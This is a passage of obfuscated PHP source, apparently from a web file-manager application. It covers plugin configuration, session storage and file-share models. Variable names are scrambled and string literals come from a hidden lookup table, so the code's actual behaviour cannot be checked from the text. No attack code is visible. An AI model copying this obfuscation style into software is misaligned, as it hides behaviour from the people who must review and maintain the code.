$this->update($®Ğ‘ğ‡î[$ç”‡­Ì¤[407]], array($ç”‡­Ì¤[1966] => $šÚ¼Óæ®)); } public function appRegist($ÆØÇÖ”ü, $€õş‰¹) { $ñÀÇ‡î =& $_SERVER[™¾ÇÙ¯¹]; $‡ÃÅ¤İé = $this->loadList($ÆØÇÖ”ü); if ($‡ÃÅ¤İé) { $this->update($‡ÃÅ¤İé[$ñÀÇ‡î[407]], array($ñÀÇ‡î[1958] => $€õş‰¹)); } else { $ ˜Ä¾îÕ = array($ñÀÇ‡î[32] => $ÆØÇÖ”ü, $ñÀÇ‡î[1958] => $€õş‰¹, $ñÀÇ‡î[765] => 0, $ñÀÇ‡î[6] => $this->getConfigDefault($ÆØÇÖ”ü)); $this->insert($ ˜Ä¾îÕ); } } public function getConfigDefault($ú©¼¸ˆô) { $Ëì÷¦ĞÒ =& $_SERVER[™¾ÇÙ¯¹]; $‰ü†£ºÖ = array(); $† ĞŸÏØ = $this->getPackageJson($ú©¼¸ˆô); if (!$† ĞŸÏØ && is_array($† ĞŸÏØ[$Ëì÷¦ĞÒ[1967]])) { return $‰ü†£ºÖ; } foreach ($† ĞŸÏØ[$Ëì÷¦ĞÒ[1967]] as $¹”ÅÕ => $ª«ŒßÇ) { if (!isset($ª«ŒßÇ[$Ëì÷¦ĞÒ[383]]) || isset($‰ü†£ºÖ[$¹”ÅÕ])) { continue; } $‰ü†£ºÖ[$¹”ÅÕ] = $ª«ŒßÇ[$Ëì÷¦ĞÒ[383]]; } return $‰ü†£ºÖ; } public function getPackageJson($²—ƒĞÇ) { return Hook::apply($²—ƒĞÇ . $_SERVER[™¾ÇÙ¯¹][1968]); } public function getConfig($‡æ‘†ñœ, $ªè¢ğ‰ = false) { $‰î¥½†¥ =& $_SERVER[™¾ÇÙ¯¹]; $ºƒßÎÍˆ = array(); $Çß²³¾‡ = $this->loadList($‡æ‘†ñœ); if ($Çß²³¾‡ && is_array($Çß²³¾‡[$‰î¥½†¥[6]])) { $ºƒßÎÍˆ = $Çß²³¾‡[$‰î¥½†¥[6]]; } if (!$ºƒßÎÍˆ || $ªè¢ğ‰) { $ºƒßÎÍˆ = $this->getConfigDefault($‡æ‘†ñœ); } return $ºƒßÎÍˆ; } public function setConfig($„é½µ·Ñ, $ÕœÓÃ¼ş = false) { $•Î—Šœå =& $_SERVER[™¾ÇÙ¯¹]; $Ü†ø¥Ó– = $this->loadList($„é½µ·Ñ); if (!$Ü†ø¥Ó–) { return !1; } $šÅã€å = $Ü†ø¥Ó–[$•Î—Šœå[6]]; if ($ÕœÓÃ¼ş == !1) { $šÅã€å = array(); $ÕœÓÃ¼ş = $this->getConfigDefault($„é½µ·Ñ); } foreach ($ÕœÓÃ¼ş as $æ ‘±£“ => $ñ© ‘«•) { $šÅã€å[$æ ‘±£“] = is_string($ñ© ‘«•) ? trim($ñ© ‘«•) : $ñ© ‘«•; } $this->update($Ü†ø¥Ó–[$•Î—Šœå[407]], array($•Î—Šœå[6] => $šÅã€å)); } public function viewList() { $Ù‘û¯Ô =& $_SERVER[™¾ÇÙ¯¹]; $Âåö–˜ = $this->loadList(); $this->pluginScan($Âåö–˜); $Âåö–˜ = $this->loadPluginList(); $æ£³Í¹º = array(); foreach ($Âåö–˜ as $’ÎÇÉ => $Îæè’Ö’) { unset($Îæè’Ö’[$Ù‘û¯Ô[1958]], $Îæè’Ö’[$Ù‘û¯Ô[6]]); $×•à„ğú = PLUGIN_DIR . $Îæè’Ö’[$Ù‘û¯Ô[32]] . $Ù‘û¯Ô[1960]; if (!is_file($×•à„ğú)) { continue; } $—ÕÂê–¾ = Hook::apply($Îæè’Ö’[$Ù‘û¯Ô[32]] . $Ù‘û¯Ô[1968]); if (is_array($—ÕÂê–¾)) { $æ£³Í¹º[$’ÎÇÉ] = array_merge($Îæè’Ö’, $—ÕÂê–¾); } } return $æ£³Í¹º; } private function loadPluginList() { $ÍŞÔŠ‡ç =& $_SERVER[™¾ÇÙ¯¹]; $Á¬èÊÎÆ = $this->loadList(); if (strtolower(MOD) == $ÍŞÔŠ‡ç[1969]) { return $Á¬èÊÎÆ; } $ôÈÀ“ = Hook::trigger($ÍŞÔŠ‡ç[1970], $Á¬èÊÎÆ); if ($Á¬èÊÎÆ && !$ôÈÀ“) { die; } return $ôÈÀ“ ? $ôÈÀ“ : $Á¬èÊÎÆ; } private function pluginScan($ôÛõøµ¤) { $æ€«ÒŞ” =& $_SERVER[™¾ÇÙ¯¹]; recursion_dir(PLUGIN_DIR, $…ÏÄ¸’, $”«éµÇ, 0); foreach ($…ÏÄ¸’ as $÷ÔÑ·ä¢) { $Â¶ããÃË = get_path_this($÷ÔÑ·ä¢); if (isset($ôÛõøµ¤[$Â¶ããÃË]) || !file_exists($÷ÔÑ·ä¢ . $æ€«ÒŞ”[1971]) || !file_exists($÷ÔÑ·ä¢ . $æ€«ÒŞ”[1960])) { continue; } Hook::apply($Â¶ããÃË . $æ€«ÒŞ”[1965]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\155\x5f\163\145\x73\x73\x69\157\x6e"; public function get($æÔ¤‹àş) { $‘Ã°‰Æ… =& $_SERVER[™¾ÇÙ¯¹]; $×…Í“” = $this->where(array($‘Ã°‰Æ…[1972] => $æÔ¤‹àş))->find(); if (!is_array($×…Í“”)) { return !1; } return $×…Í“”[$‘Ã°‰Æ…[770]]; } public function set($òì©Ş‰û, $õ¹÷Å”, $ØŒú×»´ = 3600) { $ÜàïÅ›Ò =& $_SERVER[™¾ÇÙ¯¹]; $çÉ´§®ë = array($ÜàïÅ›Ò[1972] => $òì©Ş‰û, $ÜàïÅ›Ò[1876] => $õ¹÷Å”, $ÜàïÅ›Ò[1973] => $ØŒú×»´ + time()); if (Session::get($ÜàïÅ›Ò[1974])) { $çÉ´§®ë[$ÜàïÅ›Ò[1665]] = Session::get($ÜàïÅ›Ò[1974]); } else { $çÉ´§®ë[$ÜàïÅ›Ò[1665]] = 0; } if ($this->get($òì©Ş‰û)) { return $this->where(array($ÜàïÅ›Ò[1972] => $òì©Ş‰û))->save($çÉ´§®ë); } else { return $this->add($çÉ´§®ë, array(), !0); } } public function remove($¥Ç±Ë€Ñ) { return $this->where(array($_SERVER[™¾ÇÙ¯¹][1972] => $¥Ç±Ë€Ñ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[™¾ÇÙ¯¹][1975] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\145"; protected $dataAuto = array(array("\155\157\144\x69\x66\x79\124\x69\155\145", "\x74\x69\155\145", "\151\x6e\x73\145\x72\x74\54\x75\x70\144\141\164\145", "\x66\x75\x6e\x63\164\151\157\x6e"), array("\x63\x72\145\141\x74\145\x54\151\155\x65", "\164\x69\155\x65", "\151\156\163\x65\x72\x74", "\x66\x75\156\x63\164\x69\x6f\x6e"), array("\157\x70\x74\151\157\x6e\x73", '', "\151\156\x73\x65\x72\164\x2c\x75\160\144\141\x74\145\54\163\145\x6c\145\x63\x74", "\x6a\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($üª´£Ú) { $Üºæäüì =& $_SERVER[™¾ÇÙ¯¹]; $”Ò§»› = isset($üª´£Ú[0]) ? $üª´£Ú[0] : !1; return array($Üºæäüì[1976] => array(USER_ID, $Üºæäüì[1977]), $Üºæäüì[1917] => array($”Ò§»›, $Üºæäüì[1978])); } protected function listSimple() { $×Ù™ “­ = array($_SERVER[™¾ÇÙ¯¹][1665] => USER_ID); $†ƒçÕÚĞ = $this->field($this->fieldList)->where($×Ù™ “­)->select(); return $†ƒçÕÚĞ ? $†ƒçÕÚĞ : array(); } protected function getInfo($Ñª¾–ö¼, $ó¥Ğ¥Ä = false) { $”Ìñ°Çò =& $_SERVER[™¾ÇÙ¯¹]; if ($ó¥Ğ¥Ä) { return $this->_getShareInfo(array($”Ìñ°Çò[497] => $Ñª¾–ö¼)); } $şşÄëÇŸ = $this->cacheFunctionGet($”Ìñ°Çò[1919], $Ñª¾–ö¼); return $şşÄëÇŸ; } public function getInfoByHash($•ÂÌ—ü®) { return $this->_getShareInfo(array($_SERVER[™¾ÇÙ¯¹][499] => $•ÂÌ—ü®)); } public function getInfoByPath($ŸÅ¥¿) { $·±ññ =& $_SERVER[™¾ÇÙ¯¹]; $ƒ«´ÀÚÆ = array($·±ññ[1665] => USER_ID, $·±ññ[410] => $ŸÅ¥¿); return $this->_getShareInfo($ƒ«´ÀÚÆ); } public function getInfoBySourcePath($ö¼Š¥–Í) { $ìÆÕ…×” =& $_SERVER[™¾ÇÙ¯¹]; $îË²³ = array($ìÆÕ…×”[1665] => USER_ID, $ìÆÕ…×”[1184] => $ö¼Š¥–Í); return $this->_getShareInfo($îË²³); } private function _getShareInfo($¨öøŸË) { $ŠÍì³ñÙ =& $_SERVER[™¾ÇÙ¯¹]; $Á»Èƒê = $this->where($¨öøŸË)->find(); if (!$Á»Èƒê) { return !1; } $¨öøŸË = array($ŠÍì³ñÙ[497] => $Á»Èƒê[$ŠÍì³ñÙ[497]]); $Êäƒ„Ó = $ŠÍì³ñÙ[1979]; $Â·ÖÒ± = Model($ŠÍì³ñÙ[610])->order($ŠÍì³ñÙ[407])->field($Êäƒ„Ó)->where($¨öøŸË)->select(); if ($Á»Èƒê[$ŠÍì³ñÙ[410]] == $ŠÍì³ñÙ[197]) { $Á»Èƒê[$ŠÍì³ñÙ[86]] = IO::info($Á»Èƒê[$ŠÍì³ñÙ[1184]]); } else { $Á»Èƒê[$ŠÍì³ñÙ[86]] = Model($ŠÍì³ñÙ[1335])->pathInfo($Á»Èƒê[$ŠÍì³ñÙ[410]]); } $Á»Èƒê[$ŠÍì³ñÙ[1980]] = $Â·ÖÒ±; return $Á»Èƒê; } protected function getInfoAuth($›¥ß°İË) { $Óş–çëÂ =& $_SERVER[™¾ÇÙ¯¹]; $ì¥ş„ïÇ = $this->getInfo($›¥ß°İË); if ($ì¥ş„ïÇ[$Óş–çëÂ[1665]] == USER_ID) { $ì¥ş„ïÇ[$Óş–çëÂ[421]] = $ì¥ş„ïÇ[$Óş–çëÂ[86]][$Óş–çëÂ[421]]; } else { $ì¥ş„ïÇ[$Óş–çëÂ[421]] = Model($Óş–çëÂ[510])->authMake($ì¥ş„ïÇ[$Óş–çëÂ[1980]]); } return $ì¥ş„ïÇ; } protected function listData($ÒİüğÍ = null, $•÷è—† = 300) { $Ñ—û¥½Å =& $_SERVER[™¾ÇÙ¯¹]; $ÛÚÁßé² = array(array($Ñ—û¥½Å[502] => array($Ñ—û¥½Å[1020], 0), $Ñ—û¥½Å[504] => array($Ñ—û¥½Å[1020], 0), $Ñ—û¥½Å[1981] => $Ñ—û¥½Å[1935])); if ($ÒİüğÍ == $Ñ—û¥½Å[1982]) { $ÛÚÁßé² = array($Ñ—û¥½Å[502] => 1); } else { if ($ÒİüğÍ == $Ñ—û¥½Å[1169]) { $ÛÚÁßé² = array($Ñ—û¥½Å[504] => 1); } } $ÛÚÁßé²[$Ñ—û¥½Å[1665]] = USER_ID; $­Ë›´Ñ = $this->where($ÛÚÁßé²)->selectPage($•÷è—†); return $­Ë›´Ñ; } protected function listToMe($Øò‰ å = 300) { $ù¥Òçñ„ =& $_SERVER[™¾ÇÙ¯¹]; $»¢¾¥µÃ = Model($ù¥Òçñ„[1983])->userGroupParents(USER_ID); $ÓöÃêÔ‚ = array($ù¥Òçñ„[594] => SourceModel::TYPE_USER, $ù¥Òçñ„[513] => USER_ID); if ($»¢¾¥µÃ) { $ÓöÃêÔ‚ = array(array($ù¥Òçñ„[594] => SourceModel::TYPE_USER, $ù¥Òçñ„[513] => USER_ID), array($ù¥Òçñ„[594] => SourceModel::TYPE_GROUP, $ù¥Òçñ„[513] => array($ù¥Òçñ„[7], $»¢¾¥µÃ)), $ù¥Òçñ„[1981] => $ù¥Òçñ„[1935]); } $‘Æ»óÄ› = Model($ù¥Òçñ„[610])->where($ÓöÃêÔ‚)->selectPage($Øò‰ å); $©¹ ï÷ = array_to_keyvalue_group($‘Æ»óÄ›[$ù¥Òçñ„[378]], $ù¥Òçñ„[497]); if (!$©¹ ï÷) { return $‘Æ»óÄ›; } $Ä±á’Ëš = $ù¥Òçñ„[1984]; $ÓöÃêÔ‚ = array($ù¥Òçñ„[497] => array($ù¥Òçñ„[426], array_keys($©¹ ï÷)), $ù¥Òçñ„[1665] => array($ù¥Òçñ„[1022], $ù¥Òçñ„[197])); $ñ‹°øÅã = $this->field($Ä±á’Ëš)->where($ÓöÃêÔ‚)->select(); foreach ($ñ‹°øÅã as $Š«ÚÒ => &$á©ˆâŒı) { $á©ˆâŒı[$ù¥Òçñ„[1980]] = $©¹ ï÷[$á©ˆâŒı[$ù¥Òçñ„[497]]]; } unset($á©ˆâŒı); $Æ©“®Ó» = array($ù¥Òçñ„[1985] => $ñ‹°øÅã, $ù¥Òçñ„[1986] => $‘Æ»óÄ›[$ù¥Òçñ„[375]]); return $Æ©“®Ó»; } protected function shareAdd($³Ô¡Ïï¡, $„×†÷•Ğ) { $ö˜·Ş®¢ =& $_SERVER[™¾ÇÙ¯¹]; $ÚÃ—ûƒ» = $this->_addShareData($³Ô¡Ïï¡, $„×†÷•Ğ); if (!empty($„×†÷•Ğ[$ö˜·Ş®¢[1987]])) { $this->_shareAuthSet($ÚÃ—ûƒ», $„×†÷•Ğ[$ö˜·Ş®¢[1987]]); } $this->shareEventAdd($³Ô¡Ïï¡, $„×†÷•Ğ, $ö˜·Ş®¢[1172]); return $ÚÃ—ûƒ»; } protected function shareAddSystem($÷â·¢Ê, $Ş¥€°·æ) { $ĞŞÔºİ =& $_SERVER[™¾ÇÙ¯¹]; $ç˜µ”â¯ = $this->_addShareData($÷â·¢Ê, $Ş¥€°·æ, $ĞŞÔºİ[1284]); $this->_shareAuthSet($ç˜µ”â¯, $Ş¥€°·æ[$ĞŞÔºİ[1987]]); return $ç˜µ”â¯; } private function shareEventAdd($¦¢äÆÁ, $›İ›ÚÏ, $”óÎ¹îÅ = "\141\x64\144") { $õÔò–åì =& $_SERVER[™¾ÇÙ¯¹]; if (!$¦¢äÆÁ || $¦¢äÆÁ == $õÔò–åì[197]) { return; } if ($”óÎ¹îÅ == $õÔò–åì[1172]) { if ($›İ›ÚÏ[$õÔò–åì[502]] == $õÔò–åì[88]) { Model($õÔò–åì[578])->eventShare($¦¢äÆÁ, $õÔò–åì[1988]); } if ($›İ›ÚÏ[$õÔò–åì[504]] == $õÔò–åì[88]) { Model($õÔò–åì[578])->eventShare($¦¢äÆÁ, $õÔò–åì[1989]); } return; } $‘ííÏì¦ = $this->getInfoByPath($¦¢äÆÁ); $ü±ã¤öÉ = $õÔò–åì[1990]; if ($‘ííÏì¦[$õÔò–åì[502]] == $õÔò–åì[197] && $›İ›ÚÏ[$õÔò–åì[502]] == $õÔò–åì[88]) { $ü±ã¤öÉ = $õÔò–åì[1988]; } if ($‘ííÏì¦[$õÔò–åì[502]] == $õÔò–åì[88] && $›İ›ÚÏ[$õÔò–åì[502]] == $õÔò–åì[197]) { $ü±ã¤öÉ = $õÔò–åì[1991]; } if ($‘ííÏì¦[$õÔò–åì[504]] == $õÔò–åì[197] && $›İ›ÚÏ[$õÔò–åì[504]] == $õÔò–åì[88]) { $ü±ã¤öÉ = $õÔò–åì[1989]; } if ($‘ííÏì¦[$õÔò–åì[504]] == $õÔò–åì[88] && $›İ›ÚÏ[$õÔò–åì[504]] == $õÔò–åì[197]) { $ü±ã¤öÉ = $õÔò–åì[1992]; } Model($õÔò–åì[578])->eventShare($¦¢äÆÁ, $ü±ã¤öÉ); return; } private function _addShareData($¢ˆş‡»ó, $ë××À±ç = array(), $ØÒ¶Ì²© = false) { $ò”½¾ü =& $_SERVER[™¾ÇÙ¯¹]; $Àôı®ŸÏ = $ØÒ¶Ì²© == $ò”½¾ü[1284] ? 0 : USER_ID; $ˆ½•©’ = array($ò”½¾ü[425] => $¢ˆş‡»ó, $ò”½¾ü[1656] => $Àôı®ŸÏ); if ($¢ˆş‡»ó == 0) { $ˆ½•©’ = array($ò”½¾ü[1993] => $ë××À±ç[$ò”½¾ü[1184]], $ò”½¾ü[1656] => $Àôı®ŸÏ); } if ($Á©÷Ï”Û = $this->where($ˆ½•©’)->find()) { return $Á©÷Ï”Û[$ò”½¾ü[497]]; } if ($¢ˆş‡»ó == 0) { $ïäÃëÕ« = array($ò”½¾ü[32] => get_path_this($ë××À±ç[$ò”½¾ü[84]])); } else { $ïäÃëÕ« = Model($ò”½¾ü[840])->sourceInfo($¢ˆş‡»ó); if (!$ïäÃëÕ«) { return !1; } } if (!$ë××À±ç[$ò”½¾ü[1564]]) { $ë××À±ç[$ò”½¾ü[1564]] = $ïäÃëÕ«[$ò”½¾ü[32]]; } $ş±·´È = array($ò”½¾ü[1656] => $Àôı®ŸÏ, $ò”½¾ü[425] => $¢ˆş‡»ó, $ò”½¾ü[1564] => $ò”½¾ü[12], $ò”½¾ü[502] => 0, $ò”½¾ü[504] => 0, $ò”½¾ü[1184] => $ò”½¾ü[12], $ò”½¾ü[316] => $ò”½¾ü[12], $ò”½¾ü[897] => $ò”½¾ü[12], $ò”½¾ü[1994] => 0, $ò”½¾ü[1995] => 0, $ò”½¾ü[505] => 0, $ò”½¾ü[506] => $ò”½¾ü[12], $ò”½¾ü[499] => $ò”½¾ü[12]); $Ñ¬à÷óı = explode($ò”½¾ü[50], $ò”½¾ü[1996]); foreach ($Ñ¬à÷óı as $„õ€œ¬™) { if (!isset($ë××À±ç[$„õ€œ¬™])) { continue; } $ş±·´È[$„õ€œ¬™] = $ë××À±ç[$„õ€œ¬™]; } $·ÕÛ×¾Ô = $this->add($ş±·´È); $Ê¬²Ö”á = array($ò”½¾ü[499] => short_id($·ÕÛ×¾Ô)); $this->where(array($ò”½¾ü[496] => $·ÕÛ×¾Ô))->save($Ê¬²Ö”á); return $·ÕÛ×¾Ô; } private function _shareAuthSet($ùñ¸”, $Ÿá²¶æ) { $Ê¡ØŠ…Ã =& $_SERVER[™¾ÇÙ¯¹]; if (!is_array($Ÿá²¶æ)) { return !1; } $¢ÖŞÃ = Model($Ê¡ØŠ…Ã[1945]); $¢ÖŞÃ->where(array($Ê¡ØŠ…Ã[497] => $ùñ¸”))->delete(); $‚°àÀ‚¶ = array(); foreach ($Ÿá²¶æ as $ûÈëš¼³) { $˜¯Í„Æ½ = SourceModel::TYPE_USER; if ($ûÈëš¼³[$Ê¡ØŠ…Ã[419]] == SourceModel::TYPE_GROUP) { $˜¯Í„Æ½ = SourceModel::TYPE_GROUP; } $¦ÓÍ ® = array($Ê¡ØŠ…Ã[497] => $ùñ¸”, $Ê¡ØŠ…Ã[419] => $˜¯Í„Æ½, $Ê¡ØŠ…Ã[513] => intval($ûÈëš¼³[$Ê¡ØŠ…Ã[513]]), $Ê¡ØŠ…Ã[1941] => 0, $Ê¡ØŠ…Ã[1997] => -1); if ($ûÈëš¼³[$Ê¡ØŠ…Ã[1941]]) { $¦ÓÍ ®[$Ê¡ØŠ…Ã[1941]] = $ûÈëš¼³[$Ê¡ØŠ…Ã[1941]]; } else { if ($ûÈëš¼³[$Ê¡ØŠ…Ã[1997]]) { $¦ÓÍ ®[$Ê¡ØŠ…Ã[1997]] = $ûÈëš¼³[$Ê¡ØŠ…Ã[1997]]; } } $‚°àÀ‚¶[] = $¦ÓÍ ®; } return $¢ÖŞÃ->addAll($‚°àÀ‚¶, array(), !0); } public function numViewAdd($³ª—Ì¢€) { $˜Á«„Ã• =& $_SERVER[™¾ÇÙ¯¹]; $ŸÒ‹î€Ì = array($˜Á«„Ã•[496] => $³ª—Ì¢€); $this->where($ŸÒ‹î€Ì)->setAdd($˜Á«„Ã•[1994]); } public function numDownloadAdd($†ûƒş×) { $ÏÙŸĞøœ =& $_SERVER[™¾ÇÙ¯¹]; $˜Ò•ûÂí = array($ÏÙŸĞøœ[496] => $†ûƒş×); $this->where($˜Ò•ûÂí)->setAdd($ÏÙŸĞøœ[1995]); } protected function shareEdit($À¹“Æ Œ, $³Ñ¢Êøü) { $ú¼¿Â»† =& $_SERVER[™¾ÇÙ¯¹]; $¾ƒ–ÙØª = $this->getInfo($À¹“Æ Œ); if (!$¾ƒ–ÙØª) { return !1; } $this->_checkLinkShare($³Ñ¢Êøü, $¾ƒ–ÙØª); $§¶úÌ€ = array(); $¤‘äû†È = explode($ú¼¿Â»†[50], $ú¼¿Â»†[1998]); foreach ($¤‘äû†È as $ë“ÄõİÙ) { if (!array_key_exists($ë“ÄõİÙ, $³Ñ¢Êøü)) { continue; } $§¶úÌ€[$ë“ÄõİÙ] = $³Ñ¢Êøü[$ë“ÄõİÙ]; } $this->shareEventAdd($¾ƒ–ÙØª[$ú¼¿Â»†[410]], $³Ñ¢Êøü, $ú¼¿Â»†[1807]); $this->where(array($ú¼¿Â»†[496] => $À¹“Æ Œ))->save($§¶úÌ€); if (isset($³Ñ¢Êøü[$ú¼¿Â»†[1987]])) { $this->_shareAuthSet($À¹“Æ Œ, $³Ñ¢Êøü[$ú¼¿Â»†[1987]]); } return !0; } private function _checkLinkShare($ç‚îÜ¥, $ËşÏ¥ç) { $ÏÜ³ú¤ñ =& $_SERVER[™¾ÇÙ¯¹]; if ($ç‚îÜ¥[$ÏÜ³ú¤ñ[502]] != $ÏÜ³ú¤ñ[88]) { return; } $°ì±ù² = $ËşÏ¥ç[$ÏÜ³ú¤ñ[86]][$ÏÜ³ú¤ñ[410]]; if ($ËşÏ¥ç[$ÏÜ³ú¤ñ[86]][$ÏÜ³ú¤ñ[33]] != $ÏÜ³ú¤ñ[199]) { $€Í¯ÁÙÕ = $this->_folderReport($°ì±ù²); if (!$€Í¯ÁÙÕ) { return; } show_json(LNG($ÏÜ³ú¤ñ[1999]) . $ÏÜ³ú¤ñ[2000] . $€Í¯ÁÙÕ, !1); } $‚–´ã§È = Model($ÏÜ³ú¤ñ[840])->fileInfoGet($ËşÏ¥ç[$ÏÜ³ú¤ñ[86]][$ÏÜ³ú¤ñ[410]]); if (!$‚–´ã§È) { return; } $’¢óçÁí = $this->shareFileMeta($‚–´ã§È[$ÏÜ³ú¤ñ[476]]); if (isset($’¢óçÁí[$ÏÜ³ú¤ñ[383]]) && $’¢óçÁí[$ÏÜ³ú¤ñ[383]] == $ÏÜ³ú¤ñ[88]) { show_json(LNG($ÏÜ³ú¤ñ[2001]), !1); } } private function _folderReport($ÚÜ…âçæ) { $Òé™¶Óæ =& $_SERVER[™¾ÇÙ¯¹]; $ŞÖÊèÒ = array($Òé™¶Óæ[476] => array($Òé™¶Óæ[1020], 0), $Òé™¶Óæ[765] => 3); $ø²ÒÄ˜Œ = Model($Òé™¶Óæ[2002])->where($ŞÖÊèÒ)->field($Òé™¶Óæ[476])->select(); if (!$ø²ÒÄ˜Œ) { return !1; } $ø²ÒÄ˜Œ = array_to_keyvalue($ø²ÒÄ˜Œ, $Òé™¶Óæ[12], $Òé™¶Óæ[476]); $öÆî¸‰¹ = $Òé™¶Óæ[50] . $ÚÜ…âçæ . $Òé™¶Óæ[50]; $ŞÖÊèÒ = array($Òé™¶Óæ[476] => array($Òé™¶Óæ[7], $ø²ÒÄ˜Œ), $Òé™¶Óæ[529] => array($Òé™¶Óæ[391], "\45{$öÆî¸‰¹}\x25"), $Òé™¶Óæ[439] => 0); $¶ç Í²Ú = Model($Òé™¶Óæ[840])->where($ŞÖÊèÒ)->field($Òé™¶Óæ[2003])->find(); if (!$¶ç Í²Ú) { return !1; } $ÂÎ®´Œ¿ = substr($¶ç Í²Ú[$Òé™¶Óæ[529]], strpos($¶ç Í²Ú[$Òé™¶Óæ[529]], $öÆî¸‰¹)); $ŞÖÊèÒ = array($Òé™¶Óæ[410] => array($Òé™¶Óæ[7], trim($ÂÎ®´Œ¿, $Òé™¶Óæ[50]))); $Òã÷ÔÍ = Model($Òé™¶Óæ[840])->where($ŞÖÊèÒ)->field($Òé™¶Óæ[32])->select(); $–Ä—”¼ê = array_to_keyvalue($Òã÷ÔÍ, $Òé™¶Óæ[12], $Òé™¶Óæ[32]); $–Ä—”¼ê[] = $¶ç Í²Ú[$Òé™¶Óæ[32]]; return implode($Òé™¶Óæ[8], $–Ä—”¼ê); } protected function remove($áï³ó·½) { $™„Ø–ñş =& $_SERVER[™¾ÇÙ¯¹]; if (is_array($áï³ó·½)) { $áï³ó·½ = array($™„Ø–ñş[7], $áï³ó·½); } $œœÒÍµ¹ = array($™„Ø–ñş[497] => $áï³ó·½); $¹„úà¦ö = $this->where($œœÒÍµ¹)->delete(); if ($¹„úà¦ö) { Model($™„Ø–ñş[610])->where(array($™„Ø–ñş[497] => $áï³ó·½))->delete(); } $¯¼÷ıÇÊ = is_array($áï³ó·½) ? $áï³ó·½[1] : array($áï³ó·½); for ($ıæ‰ù‹» = 0; $ıæ‰ù‹» < count($¯¼÷ıÇÊ); $ıæ‰ù‹»++) { $¬×½×¤ê = $this->getInfo($¯¼÷ıÇÊ[$ıæ‰ù‹»]); if ($¬×½×¤ê[$™„Ø–ñş[504]] == $™„Ø–ñş[88]) { Model($™„Ø–ñş[578])->eventShare($¬×½×¤ê[$™„Ø–ñş[410]], $™„Ø–ñş[1992]); } if ($¬×½×¤ê[$™„Ø–ñş[502]] == $™„Ø–ñş[88]) { Model($™„Ø–ñş[578])->eventShare($¬×½×¤ê[$™„Ø–ñş[410]], $™„Ø–ñş[1991]); } } return $¹„úà¦ö; } protected function removeBySource($‹¸ÑƒİŞ) { $µ®…ñÒˆ =& $_SERVER[™¾ÇÙ¯¹]; $ÛÌ¤ñ¦ø = array($µ®…ñÒˆ[425] => array($µ®…ñÒˆ[426], $‹¸ÑƒİŞ)); $¯´¥²‚· = $this->field($µ®…ñÒˆ[497])->where($ÛÌ¤ñ¦ø)->select(); $¯´¥²‚· = array_to_keyvalue($¯´¥²‚·, $µ®…ñÒˆ[12], $µ®…ñÒˆ[497]); if (!$¯´¥²‚·) { return; } $ÛÌ¤ñ¦ø = array($µ®…ñÒˆ[496] => array($µ®…ñÒˆ[426], $¯´¥²‚·)); $this->where($ÛÌ¤ñ¦ø)->delete(); Model($µ®…ñÒˆ[610])->where($ÛÌ¤ñ¦ø)->delete(); } public function listAll($èŠù§åÑ) { $Ú§Ö°Ğ¢ =& $_SERVER[™¾ÇÙ¯¹]; $ŒÙ‰•Œæ = array(); if ($èŠù§åÑ[$Ú§Ö°Ğ¢[1665]]) { $ŒÙ‰•Œæ[$Ú§Ö°Ğ¢[1665]] = $èŠù§åÑ[$Ú§Ö°Ğ¢[1665]]; } if ($èŠù§åÑ[$Ú§Ö°Ğ¢[776]]) { $ĞŒ½¨’ = $èŠù§åÑ[$Ú§Ö°Ğ¢[505]] ? $èŠù§åÑ[$Ú§Ö°Ğ¢[505]] : strtotime(date($Ú§Ö°Ğ¢[2004])); $ŒÙ‰•Œæ[$Ú§Ö°Ğ¢[200]] = array($Ú§Ö°Ğ¢[342], array($èŠù§åÑ[$Ú§Ö°Ğ¢[776]], $ĞŒ½¨’)); } if ($èŠù§åÑ[$Ú§Ö°Ğ¢[33]]) { $ŒÙ‰•Œæ[$èŠù§åÑ[$Ú§Ö°Ğ¢[33]]] = 1; } else { $ŒÙ‰•Œæ[] = array($Ú§Ö°Ğ¢[502] => array($Ú§Ö°Ğ¢[1020], 0), $Ú§Ö°Ğ¢[504] => array($Ú§Ö°Ğ¢[1020], 0), $Ú§Ö°Ğ¢[1981] => $Ú§Ö°Ğ¢[1935]); } if ($èŠù§åÑ[$Ú§Ö°Ğ¢[1931]]) { $ŒÙ‰•Œæ[] = array($Ú§Ö°Ğ¢[499] => $èŠù§åÑ[$Ú§Ö°Ğ¢[1931]], $Ú§Ö°Ğ¢[1564] => array($Ú§Ö°Ğ¢[391], "\x25{$èŠù§åÑ[$Ú§Ö°Ğ¢[1931]]}\45"), $Ú§Ö°Ğ¢[1981] => $Ú§Ö°Ğ¢[1935]); } $ß÷Ò–èª = $this->_makeOrder()->where($ŒÙ‰•Œæ)->selectPage(20); if (empty($ß÷Ò–èª[$Ú§Ö°Ğ¢[378]])) { return array(); } $this->_listDataApply($ß÷Ò–èª[$Ú§Ö°Ğ¢[378]]); return $ß÷Ò–èª; } public function listDataApply($­“äÛ¶Ô) { $this->_listDataApply($­“äÛ¶Ô); return $­“äÛ¶Ô; } private function _listDataApply(&$šİ¿©„´) { $ÙåÀ‡ =& $_SERVER[™¾ÇÙ¯¹]; $Éû›¶ÁÉ = array_to_keyvalue($šİ¿©„´, $ÙåÀ‡[12], $ÙåÀ‡[1665]); $ïô‡Õä¼ = Model($ÙåÀ‡[543])->userListInfo(array_unique($Éû›¶ÁÉ)); $’òÒ¦• = array_to_keyvalue($šİ¿©„´, $ÙåÀ‡[12], $ÙåÀ‡[410]); $Õé•Ø”¼ = Model($ÙåÀ‡[840])->sourceListInfo($’òÒ¦•, !0); foreach ($šİ¿©„´ as $°°¾¥ü› => &$èëë´í) { $ğ¾ÈÚºƒ = $èëë´í[$ÙåÀ‡[1665]]; $èëë´í[$ÙåÀ‡[2005]] = $ïô‡Õä¼[$ğ¾ÈÚºƒ] ? $ïô‡Õä¼[$ğ¾ÈÚºƒ] : !1; $”ÜÍöŸ” = $èëë´í[$ÙåÀ‡[410]]; $èëë´í[$ÙåÀ‡[86]] = $Õé•Ø”¼[$”ÜÍöŸ”] ? $Õé•Ø”¼[$”ÜÍöŸ”] : !1; if ($èëë´í[$ÙåÀ‡[86]][$ÙåÀ‡[439]] == $ÙåÀ‡[88]) { unset($šİ¿©„´[$°°¾¥ü›]); } if ($èëë´í[$ÙåÀ‡[86]] != $ÙåÀ‡[197] && !$èëë´í[$ÙåÀ‡[86]]) { unset($šİ¿©„´[$°°¾¥ü›]); } } 